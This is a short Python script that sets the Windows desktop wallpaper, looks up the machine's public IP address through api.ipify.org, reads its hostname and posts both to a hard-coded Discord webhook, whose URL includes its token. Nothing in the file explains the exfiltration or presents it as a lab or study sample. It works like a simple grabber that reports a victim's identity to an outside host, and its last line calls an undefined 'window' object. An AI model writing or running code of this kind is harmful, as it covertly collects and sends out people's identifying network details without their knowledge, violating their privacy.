import os
from discord_webhook import DiscordWebhook
import socket
import webbrowser
import requests
import ctypes
SPI_SETDESKWALLPAPER = 20 
ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "wallpaper.png" , 0)

def get_ip_address():
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    return ip_address
ip = get_ip_address()
pc = socket.gethostname()




webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
response = webhook.execute()


window.close()